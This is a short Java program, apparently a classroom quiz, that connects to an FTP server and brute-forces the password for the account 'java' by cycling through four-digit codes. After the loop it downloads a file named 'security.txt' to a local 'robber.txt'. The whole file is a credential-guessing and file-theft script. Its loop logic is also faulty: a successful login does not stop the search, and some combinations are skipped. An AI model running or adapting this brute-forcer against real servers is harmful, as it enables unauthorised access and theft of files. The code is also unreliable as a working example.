package Day08;

import it.sauronsoftware.ftp4j.FTPClient;
import it.sauronsoftware.ftp4j.FTPFile;

import java.io.File;
import java.util.Scanner;

public class Quiz02 {
    public static void main(String[] args) {
        FTPClient client = new FTPClient();
        Scanner sc = new Scanner(System.in);
        System.out.println("===============");
        System.out.println("Input IP :");
        String ip = sc.nextLine();
        System.out.println("Input Port :");
        int port = Integer.parseInt(sc.nextLine());
        try {
            System.out.println("Try to connect "+ip+" port :"+port);
            client.connect(ip,port);
            System.out.println("<< FTP Server is Connected >>");
        }catch (Exception e)
        {
            System.out.println("Connecting Server Failure..");
        }
        String[] arr = new String[]{"1","1","1","1"};
        String passwd = "";
        for(int i=1; i< 10; i++)
        {
            for(int j=1; j<10; j++)
            {
                for(int ii=1;ii<10; ii++)
                {
                    for(int jj=1; jj<10; jj++)
                    {
                        arr[3] = String.valueOf(jj);
                        passwd = arr[0]+""+arr[1]+""+arr[2]+""+arr[3];
                        System.out.println(passwd);
                        try {
                            client.login("java", passwd);
                            break;
                        }catch (Exception e)
                        {
                            System.out.println("실패");
                        }
                        arr[2] = String.valueOf(ii);
                    }
                    arr[1] = String.valueOf(j);
                }
                arr[0] = String.valueOf(i);
            }
        }
        try{
            File downFile = new File("C:/FTPHome/Download/robber.txt");
            client.download("security.txt", downFile);
        }catch (Exception e)
        {
            System.out.println("으악");
        }
        try {
            client.disconnect(true);
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
}
